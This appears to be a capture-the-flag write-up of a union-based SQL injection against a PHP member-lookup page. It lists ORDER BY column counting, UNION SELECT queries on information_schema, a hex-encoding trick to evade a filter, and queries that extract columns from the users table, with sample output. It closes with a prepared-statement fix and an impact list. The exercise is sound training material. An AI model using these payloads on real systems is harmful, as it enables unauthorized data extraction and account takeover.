- On this page, we can look for members though their IDs.
- We can suppose the original query looks like something like this:
    - $id = $_GET['id'];
    - $sql = "SELECT * FROM users WHERE id = $id";  (Vulnerable)

- The fifth one is telling "Hack me", let's guess how many columns there are:
    - 5 ORDER BY 1
    - 5 ORDER BY 2
    - 5 ORDER BY 3 -> Error, we can guess that there is only 2 columns.


- 5 UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()

```
ID: 5 UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database() 
First name: Flag
Surname : GetThe
ID: 5 UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database() 
First name: users
Surname : 2
```

- this confirms us that the table users exist.
- 5 UNION SELECT column_name, 2 FROM information_schema.columns WHERE table_name = users -- -
- This doesnt work maybe because there may e a WAF or something that block the "users" string. We can just encode this in hexadecimal and it works.
- 5 UNION SELECT column_name, 2 FROM information_schema.columns WHERE table_name = 0x7573657273 -- -
- In human: "Give me the table_name from the list of all tables, but only for the database I’m currently in."



```
in here we can look for members trough their ID, let's have a look at each one.
The fifth on is screaming hack me! Let's pop it's columns names.

5 ORDER BY 1
5 order by 2
3 doesn't work so it stops there.

5 UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()
we know now that the name of the first table is users so lets encode it and retrieve the rest of the columns names
5 UNION SELECT column_name, 2 FROM information_schema.columns WHERE table_name = 0x7573657273 -- -
5 union select Commentaire, 2 from users
5 UNION SELECT countersign, 2 FROM users -- -

First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !

the original input form might be like this since we need 2 columns to validate the query :
    SELECT title, url FROM list_images WHERE id = 5

5 UNION SELECT table_name, 2 FROM information_schema.tables WHERE table_schema = database()
so in here 5 validates the query,
UNION combines results of two SELECT queries so we can
continue another query with it.
SELECT table_name, 2
table_name -> lists table names and 2 is just a filler
to satisfy the 2-column SELECT structure.FROM information_schema.tables
information_schema.tables is a system table that holds
metadata about all tables in the DB.
by querying this we can list all tables in the database.WHERE table_schema = database()
table_schema -> database name associated with each table.
database() -> is a function that returns the current DB name
so this condition ensures we are listing only tables from the current DB.
in human : "Give me the table_name from the list of all tables, but only for the database I’m currently in."
```



- How to prevent:
    1. Sanitize input
    2. Use PDO with php to prepare sql query before sending it prevent sql injections thank to parameterization
        ```php
        $stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
        $stmt->execute(['id' => $_GET['id']]);
        ```
        - Becomes: SELECT * FROM users WHERE id = '1 OR 1=1'; (User input is now one interpreted as one string prevent SQLi)

- Impact:
    1. Leak of data
    2. Data manipulation
    3. Bypassing authentication leading to account takeover
